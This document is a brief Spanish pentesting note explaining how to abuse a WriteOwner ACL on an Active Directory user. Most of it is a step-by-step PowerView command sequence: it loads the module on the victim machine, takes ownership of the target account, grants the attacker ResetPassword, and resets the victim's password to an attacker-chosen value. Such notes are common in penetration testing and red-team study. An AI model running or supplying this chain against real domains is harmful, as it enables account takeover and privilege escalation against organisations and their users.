# Abuso ACL 

Tags: #AD #ACL #Windows

## WriteOwner sobre Usuario 

Si tenemos esta ACL sobre un usuario, podemos cambiar el propietario del objeto. Una vez que somos propietarios, podemos modificar la ACL del usuario para otorgarnos ResetPassword y así cambiar su contraseña.

```powershell 
Paso 1:
# Cargar PowerView a la máquina víctima 
❯ Import-Module .\PowerView.ps1
```

```powershell 
Paso 2:
# Cambiar el propietario del objeto
❯ Set-DomainObjectOwner -Identity "TargetUser" -OwnerIdentity "ControlledAccount"

	# TargetUser = Usuario víctima (Objetivo)
	# ControlledAccount = Usuario atacante (Controlas)

Paso 3:
# Dar permiso para resetear la contraseña
❯ Add-DomainObjectAcl -TargetIdentity "TargetUser" -PrincipalIdentity "ControlledAccount" -Rights ResetPassword

Paso 4:
# Crear una SecureString con la nueva contraseña
❯ $cred = ConvertTo-SecureString 'P@$$w0rd123!' -AsPlainText -Force

Paso 5:
# Cambiar la contraseña del usuario víctima 
❯ Set-DomainUserPassword -Identity "TargetUser" -AccountPassword $cred
```